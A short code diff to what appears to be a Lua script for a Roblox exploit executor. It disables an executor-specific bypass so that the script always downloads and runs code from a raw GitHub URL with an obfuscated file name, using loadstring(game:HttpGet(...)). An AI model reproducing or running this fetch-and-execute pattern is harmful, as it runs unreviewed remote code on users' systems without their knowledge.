@@ -386,13 +386,14 @@ do
         end
     end
 
-    if exec:find("wave") then
+    if exec:find("removedfornowuntillsomeonehasanissue") then
         warn("Bypassing check: due to wave")
     else
-        -- Any other executor → run it
         loadstring(game:HttpGet(
             "https://raw.githubusercontent.com/kc-ignore/safety/refs/heads/main/AJKSDHJKDHDJKHSJKDHJDKSHJKSHDJKHD"
         ))()
+
+		warn("If issues happen with security(wave) make a ticket")
     end
 end
 
